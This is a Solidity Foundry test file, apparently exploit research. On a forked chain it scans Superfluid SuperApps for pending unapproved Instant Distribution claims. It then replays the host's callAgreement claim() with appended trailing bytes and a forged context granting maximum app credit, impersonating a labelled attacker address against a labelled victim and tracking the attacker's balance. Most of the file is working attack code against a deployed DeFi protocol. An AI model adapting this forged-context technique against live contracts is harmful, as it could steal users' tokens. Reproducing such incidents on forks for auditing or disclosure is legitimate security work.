// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {stdJson} from "forge-std/StdJson.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperToken {
    function getHost() external view returns (address);
}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);

    function isApp(address app) external view returns (bool);

    function getAppManifest(address app) external view returns (bool isSuperApp, bool isJailed, uint256 noopMask);
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function claim(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getIndex(
        ISuperToken token,
        address publisher,
        uint32 indexId
    ) external view returns (bool exist, uint128 indexValue, uint128 totalUnitsApproved, uint128 totalUnitsPending);

    function getSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber
    ) external view returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);

    function listSubscriptions(
        ISuperToken token,
        address subscriber
    ) external view returns (address[] memory publishers, uint32[] memory indexIds, uint128[] memory unitsList);
}

/// @title Attempt4
/// @notice Hypothesis: historically registered SuperApps still have live IDA
///         relationships on the patched fork, and at least one unapproved
///         pending claim exists where the publisher is itself a registered
///         SuperApp. If so, host trailing-bytes `claim()` can be replayed on a
///         real callback target instead of an unregistered probe.
contract Attempt4 is Test {
    using stdJson for string;

    struct ClaimTarget {
        bool found;
        uint8 tokenSlot;
        address publisher;
        address subscriber;
        uint32 indexId;
        bool approved;
        uint128 units;
        uint256 pendingDistribution;
        uint128 indexValue;
        uint128 totalUnitsApproved;
        uint128 totalUnitsPending;
        bool publisherIsApp;
        bool publisherJailed;
    }

    struct SubscriptionSnapshot {
        bool exist;
        bool approved;
        uint128 units;
        uint256 pendingDistribution;
        bool indexExist;
        uint128 indexValue;
        uint128 totalUnitsApproved;
        uint128 totalUnitsPending;
        bool publisherIsApp;
        bool publisherJailed;
    }

    struct ScanStats {
        uint256 liveApps;
        uint256 jailedApps;
        uint256 subscriptionHits;
        uint256 publisherAppHits;
        uint256 pendingHits;
        uint256 detailedLogs;
    }

    struct AppScanDelta {
        uint256 subscriptionHits;
        uint256 publisherAppHits;
        uint256 pendingHits;
        uint256 detailedLogs;
        ClaimTarget target;
    }

    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address constant KNOWN_USDCX_VICTIM = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;
    uint256 constant FORK_BLOCK = 27_039_967;

    ISuperfluidHost constant HOST = ISuperfluidHost(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 constant IDA =
        IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);
        vm.label(ATTACKER, "Attacker");
        vm.label(KNOWN_USDCX_VICTIM, "KnownUSDCxVictim");
        vm.label(address(HOST), "SuperfluidHost");
        vm.label(address(IDA), "IDA");
    }

    function test_registered_superapps_and_live_ida_claim_targets() public {
        uint256 nativeBefore = ATTACKER.balance;
        string memory json = vm.readFile("recon/app_addresses.json");
        address[] memory apps = json.readAddressArray(".addresses");

        console.log("[start] attacker native:", nativeBefore);
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);
        console.log("[scan] historical AppRegistered addresses:", apps.length);

        _logAppStatus("attacker", ATTACKER);
        _logAppStatus("host", address(HOST));
        _logAppStatus("ida", address(IDA));
        _logAppStatus("known victim", KNOWN_USDCX_VICTIM);

        ScanStats memory stats;
        ClaimTarget memory target;

        for (uint256 i = 0; i < apps.length; ++i) {
            address app = apps[i];
            bool hostIsApp = HOST.isApp(app);
            (bool manifestIsSuperApp, bool isJailed,) = HOST.getAppManifest(app);

            if (!hostIsApp || !manifestIsSuperApp) {
                continue;
            }

            stats.liveApps += 1;
            if (isJailed) {
                stats.jailedApps += 1;
            }

            AppScanDelta memory delta = _scanAppSubscriptions(app, stats.detailedLogs, target.found);
            stats.subscriptionHits += delta.subscriptionHits;
            stats.publisherAppHits += delta.publisherAppHits;
            stats.pendingHits += delta.pendingHits;
            stats.detailedLogs = delta.detailedLogs;
            if (!target.found && delta.target.found) target = delta.target;
        }

        console.log("[summary] live historical apps still registered:", stats.liveApps);
        console.log("[summary] live apps jailed:", stats.jailedApps);
        console.log("[summary] live subscription hits:", stats.subscriptionHits);
        console.log("[summary] subscription hits with publisher app:", stats.publisherAppHits);
        console.log("[summary] unapproved pending subscriptions:", stats.pendingHits);

        assertGt(apps.length, 0, "AppRegistered scan should not be empty");
        assertGt(stats.liveApps, 0, "historical registered apps should still exist on fork");

        if (target.found) {
            _probeClaimTarget(target);
        } else {
            console.log("[candidate] none found with publisher app + pending unapproved distribution");
        }

        uint256 nativeAfter = ATTACKER.balance;
        int256 nativeDelta = int256(nativeAfter) - int256(nativeBefore);
        console.log("[end] attacker native:", nativeAfter);
        console.log("[delta] attacker native:", nativeDelta);
    }

    function _scanAppSubscriptions(
        address app,
        uint256 startingDetailedLogs,
        bool alreadyFoundTarget
    ) internal view returns (AppScanDelta memory delta) {
        delta.detailedLogs = startingDetailedLogs;

        for (uint8 tokenSlot = 0; tokenSlot < 5; ++tokenSlot) {
            (ISuperToken token, string memory symbol) = _tokenAt(tokenSlot);
            (address[] memory publishers, uint32[] memory indexIds,) = IDA.listSubscriptions(token, app);

            if (publishers.length == 0) {
                continue;
            }

            delta.subscriptionHits += publishers.length;
            if (delta.detailedLogs < 20) {
                console.log("[sub-list] app:", app);
                console.log("  token:", symbol);
                console.log("  entries:", publishers.length);
                delta.detailedLogs += 1;
            }

            for (uint256 j = 0; j < publishers.length; ++j) {
                address publisher = publishers[j];
                uint32 indexId = indexIds[j];
                SubscriptionSnapshot memory snap = _snapshotSubscription(token, publisher, indexId, app);

                if (snap.publisherIsApp) {
                    delta.publisherAppHits += 1;
                }
                if (!snap.approved && snap.pendingDistribution > 0) {
                    delta.pendingHits += 1;
                }

                if (
                    delta.detailedLogs < 40
                        && (
                            snap.publisherIsApp || snap.pendingDistribution > 0 || publisher == app
                                || KNOWN_USDCX_VICTIM == publisher || KNOWN_USDCX_VICTIM == app
                        )
                ) {
                    console.log("[sub-hit] token:", symbol);
                    console.log("  publisher:", publisher);
                    console.log("  subscriber:", app);
                    console.log("  publisherIsApp:", snap.publisherIsApp);
                    console.log("  publisherJailed:", snap.publisherJailed);
                    console.log("  indexId:", uint256(indexId));
                    console.log("  exist:", snap.exist);
                    console.log("  indexExist:", snap.indexExist);
                    console.log("  approved:", snap.approved);
                    console.log("  units:", uint256(snap.units));
                    console.log("  pending:", snap.pendingDistribution);
                    console.log("  indexValue:", uint256(snap.indexValue));
                    console.log("  totalUnitsPending:", uint256(snap.totalUnitsPending));
                    console.log("  totalUnitsApproved:", uint256(snap.totalUnitsApproved));
                    delta.detailedLogs += 1;
                }

                if (
                    !alreadyFoundTarget && !delta.target.found && snap.exist && snap.indexExist && snap.publisherIsApp
                        && !snap.publisherJailed && !snap.approved && snap.pendingDistribution > 0
                ) {
                    delta.target = ClaimTarget({
                        found: true,
                        tokenSlot: tokenSlot,
                        publisher: publisher,
                        subscriber: app,
                        indexId: indexId,
                        approved: snap.approved,
                        units: snap.units,
                        pendingDistribution: snap.pendingDistribution,
                        indexValue: snap.indexValue,
                        totalUnitsApproved: snap.totalUnitsApproved,
                        totalUnitsPending: snap.totalUnitsPending,
                        publisherIsApp: snap.publisherIsApp,
                        publisherJailed: snap.publisherJailed
                    });
                }
            }
        }
    }

    function _probeClaimTarget(ClaimTarget memory target) internal {
        (ISuperToken token, string memory symbol) = _tokenAt(target.tokenSlot);
        bytes memory forgedCtx = _buildFakeClaimContext(target.publisher, address(token));

        console.log("[candidate] token:", symbol);
        console.log("  publisher:", target.publisher);
        console.log("  subscriber:", target.subscriber);
        console.log("  indexId:", uint256(target.indexId));
        console.log("  pending:", target.pendingDistribution);
        console.log("  units:", uint256(target.units));

        uint256 snapPlain = vm.snapshotState();
        vm.recordLogs();
        vm.prank(ATTACKER);
        (bool plainOk, bytes memory plainRet) = _callAgreementRaw(
            abi.encodeCall(IDA.claim, (token, target.publisher, target.indexId, target.subscriber, new bytes(0)))
        );
        Vm.Log[] memory plainLogs = vm.getRecordedLogs();
        require(vm.revertToStateAndDelete(snapPlain), "plain snapshot revert failed");

        uint256 snapForged = vm.snapshotState();
        vm.recordLogs();
        vm.prank(ATTACKER);
        (bool forgedOk, bytes memory forgedRet) = _callAgreementWithTrailingBytes(
            abi.encodeCall(IDA.claim, (token, target.publisher, target.indexId, target.subscriber, forgedCtx))
        );
        Vm.Log[] memory forgedLogs = vm.getRecordedLogs();
        require(vm.revertToStateAndDelete(snapForged), "forged snapshot revert failed");

        console.log("[claim plain] ok:", plainOk);
        console.log("[claim plain] emitted logs:", plainLogs.length);
        if (plainOk) {
            _logReturnedCtx("plain", plainRet);
        } else {
            console.log("[claim plain] revert:");
            console.logBytes(plainRet);
            console.log("[claim plain] decoded:");
            console.log(_decodeRevert(plainRet));
        }

        console.log("[claim forged] ok:", forgedOk);
        console.log("[claim forged] emitted logs:", forgedLogs.length);
        if (forgedOk) {
            _logReturnedCtx("forged", forgedRet);
        } else {
            console.log("[claim forged] revert:");
            console.logBytes(forgedRet);
            console.log("[claim forged] decoded:");
            console.log(_decodeRevert(forgedRet));
        }
    }

    function _callAgreementRaw(bytes memory inner) internal returns (bool ok, bytes memory ret) {
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, inner, new bytes(0))));
    }

    function _callAgreementWithTrailingBytes(bytes memory inner) internal returns (bool ok, bytes memory ret) {
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, outer, new bytes(0))));
    }

    function _buildFakeClaimContext(address appAddress, address appCreditToken) internal view returns (bytes memory) {
        ContextUtils.Context memory ctx = ContextUtils.buildContext(appAddress, IDA.claim.selector, "");
        ctx.appCreditGranted = type(uint128).max;
        ctx.appAddress = appAddress;
        ctx.appCreditToken = appCreditToken;
        return ContextUtils.encodeContext(ctx);
    }

    function _snapshotSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber
    ) internal view returns (SubscriptionSnapshot memory snap) {
        (snap.exist, snap.approved, snap.units, snap.pendingDistribution) =
            IDA.getSubscription(token, publisher, indexId, subscriber);
        (snap.indexExist, snap.indexValue, snap.totalUnitsApproved, snap.totalUnitsPending) =
            IDA.getIndex(token, publisher, indexId);

        snap.publisherIsApp = HOST.isApp(publisher);
        (bool manifestIsSuperApp, bool publisherJailed,) = HOST.getAppManifest(publisher);
        snap.publisherIsApp = snap.publisherIsApp && manifestIsSuperApp;
        snap.publisherJailed = publisherJailed;
    }

    function _logReturnedCtx(string memory label, bytes memory ret) internal view {
        bytes memory newCtx = abi.decode(ret, (bytes));
        ContextUtils.Context memory decoded = ContextUtils.decodeContext(newCtx);
        console.log("[returned ctx]", label);
        console.log("  msgSender:", decoded.msgSender);
        console.log("  appAddress:", decoded.appAddress);
        console.log("  appCreditGranted:", decoded.appCreditGranted);
        console.log("  appCreditToken:", decoded.appCreditToken);
    }

    function _logAppStatus(string memory label, address app) internal view {
        (bool isSuperApp, bool isJailed, uint256 noopMask) = HOST.getAppManifest(app);
        console.log("[app-check]", label);
        console.log("  addr:", app);
        console.log("  isApp:", HOST.isApp(app));
        console.log("  manifest.isSuperApp:", isSuperApp);
        console.log("  manifest.isJailed:", isJailed);
        console.log("  manifest.noopMask:", noopMask);
    }

    function _tokenAt(uint8 tokenSlot) internal pure returns (ISuperToken token, string memory symbol) {
        if (tokenSlot == 0) return (ISuperToken(0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2), "DAIx");
        if (tokenSlot == 1) return (ISuperToken(0x27e1e4E6BC79D93032abef01025811B7E4727e85), "ETHx");
        if (tokenSlot == 2) return (ISuperToken(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3), "MATICx");
        if (tokenSlot == 3) return (ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F), "USDCx");
        if (tokenSlot == 4) return (ISuperToken(0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92), "WBTCx");
        revert("bad token slot");
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            if (revertData.length == 0) {
                return "silent revert";
            }
            return string(revertData);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "custom/unknown";
    }
}
